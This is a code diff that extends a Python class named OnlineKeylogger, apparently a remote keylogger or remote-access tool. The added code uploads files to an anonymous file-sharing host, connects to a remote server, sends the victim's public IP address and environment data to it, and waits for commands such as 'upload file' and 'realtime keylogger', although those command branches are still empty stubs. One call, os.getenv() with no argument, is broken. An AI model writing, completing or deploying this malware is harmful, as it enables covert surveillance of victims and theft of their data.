@@ -1,7 +1,11 @@
 import socket
+from anonfile import AnonFile
+
 from src.functions.listener import *
 from src.encryption.encryptionsys import *
 import shutil
+import requests
+import os
 
 
 class OnlineKeylogger:
@@ -37,3 +41,30 @@ class OnlineKeylogger:
                 break
             else:
                 break
+
+    def anonfile(self, file):
+        anon = AnonFile()
+        upload = anon.upload(file)
+        return upload.url.geturl()
+
+    def connectionHandle(self):
+        try:
+            print("Connecting to a server")
+            self.client.connect((self.ip, self.port))
+
+        except TimeoutError:
+            return self.connectionHandle()
+
+        target_ip = requests.get("https://checkip.amazonaws.com").text.strip()
+        target_system = os.getenv()
+        self.client.send(bytes(target_ip, self._ENCODING_FORMAT))
+        self.client.send(bytes(target_system, self._ENCODING_FORMAT))
+
+        while True:
+            command = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
+            if command == "transfer":
+                pass
+            elif command == "upload file":
+                pass
+            elif command == "realtime keylogger":
+                pass
